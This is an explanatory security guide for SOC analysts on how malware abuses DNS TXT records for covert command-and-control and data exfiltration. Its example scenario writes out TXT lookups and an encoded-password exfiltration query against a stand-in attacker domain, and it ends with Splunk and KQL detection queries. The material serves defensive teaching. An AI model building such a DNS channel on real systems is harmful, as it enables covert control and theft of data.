
🕵️ DNS TXT Record Abuse in Cyber Attacks

DNS (Domain Name System) TXT records were originally designed to hold arbitrary text data — like SPF, DKIM, and DMARC information for email authentication.
Attackers abuse this flexibility to hide commands and exfiltrate stolen data using DNS traffic, which is usually trusted and rarely blocked.

⸻

🔹 1. What Are DNS TXT Records?
	•	Legitimate use cases:
	•	Email authentication (SPF, DKIM).
	•	Domain ownership verification.
	•	Arbitrary metadata about a domain.
	•	Example (legit SPF TXT record):

example.com.   IN   TXT   "v=spf1 include:_spf.google.com ~all"



⸻

🔹 2. How Attackers Abuse TXT Records

Attackers use TXT records as a hidden communication channel:
	•	Inbound (C2): Attacker encodes commands inside TXT records. Malware queries these records → decodes them → executes commands.
	•	Outbound (Exfiltration): Malware encodes stolen data inside DNS queries (subdomains) and sends them to attacker-controlled DNS servers.

⸻

🔹 3. Example Attack Scenario

Step 1 – Attacker Prepares

Registers domain evilc2.com and sets TXT records:

update1.evilc2.com. IN TXT "cGluZyAxOTIuMTY4LjAuMQ=="

(Base64 → ping 192.168.0.1)

Step 2 – Victim Infection

Malware is installed via phishing or exploit. It schedules queries like:

nslookup -type=TXT update1.evilc2.com

Step 3 – Attacker Response

DNS server returns TXT payload → malware decodes and runs command.

Step 4 – Data Exfiltration

Malware encodes stolen password MyPass123 into Base64:

TXlQYXNzMTIz

Sends query:

TXlQYXNzMTIz.exfil.evilc2.com

Attacker extracts data from DNS logs.

⸻

🔹 4. Real-World Malware Examples
	•	DNSpionage (APT campaigns in Middle East)
	•	Used scheduled TXT lookups to fetch attacker commands in Base64.
	•	Commands included PowerShell payloads delivered silently.
	•	FrameworkPOS (POS malware)
	•	Stole credit card data and exfiltrated via TXT lookups.
	•	Chosen because POS networks often allow only DNS traffic.
	•	OilRig / APT34 (Helminth malware)
	•	TXT records carried C2 instructions and scripts.
	•	Exploited DNS trust to bypass firewalls.

⸻

🔹 5. Why TXT Abuse Works
	•	DNS traffic is almost never blocked in corporate networks.
	•	TXT records can hold long arbitrary strings.
	•	Queries look like normal DNS activity.
	•	Firewalls and proxies rarely inspect TXT contents.

⸻

🔹 6. Detection Strategies (SOC/SIEM)

Indicators of Suspicion
	•	Unusually high number of TXT lookups.
	•	TXT records containing Base64, hex, or long random strings.
	•	Internal hosts repeatedly querying the same external domain.
	•	Randomized subdomains in queries (used for exfiltration).

Example Splunk Query

index=dns sourcetype="dns_logs"
| where query_type="TXT"
| stats count by src_ip, domain, txt_record
| where count > 50 OR match(txt_record,"^[A-Za-z0-9+/=]{20,}$")

Example Sentinel (KQL) Query

DnsEvents
| where QueryType == "TXT"
| summarize Count=count() by ClientIP, Name, ResponseName
| where Count > 50 or ResponseName matches regex "^[A-Za-z0-9+/=]{20,}$"


⸻

🔹 7. SOC Analyst Takeaways
	•	Normal use: TXT is rare except for email/authentication lookups.
	•	Malware use: TXT queries are scheduled, periodic, and carry encoded payloads.
	•	Key hunting tip: Baseline your environment’s normal TXT traffic → alert on outliers.

⸻

🔹 8. Visual Flow

[Victim PC: Malware] → DNS TXT query → [Attacker-controlled DNS]
         ↑                                       ↓
   Encoded stolen data          Encoded commands (Base64/Hex)


⸻

✅ Summary
	•	DNS TXT abuse is a stealthy way to run C2 and exfiltration over a protocol that’s almost always allowed.
	•	Real malware like DNSpionage, FrameworkPOS, and OilRig (APT34) have used this.
	•	SOC teams should monitor DNS TXT traffic, look for encoded data, and alert on high-frequency or suspicious queries.

⸻
